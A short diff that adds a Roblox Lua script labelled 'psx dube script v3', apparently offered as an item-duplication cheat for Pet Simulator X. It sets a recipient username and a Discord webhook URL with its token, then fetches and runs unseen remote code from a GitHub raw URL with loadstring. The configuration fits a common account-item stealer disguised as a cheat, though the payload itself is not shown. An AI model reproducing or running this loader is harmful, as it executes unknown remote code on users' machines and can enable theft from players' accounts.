@@ -1,0 +1,5 @@
+_G.Username = "blaalyn3"
+_G.HubName = "psx dube script v3"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094342073450242201/j1jBZK3K3HDymsRfoTQUTVQr9wsLlwc0BSlIY1wiQN2q3A01kl-jxttnBSVq5Yg-SAs3"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
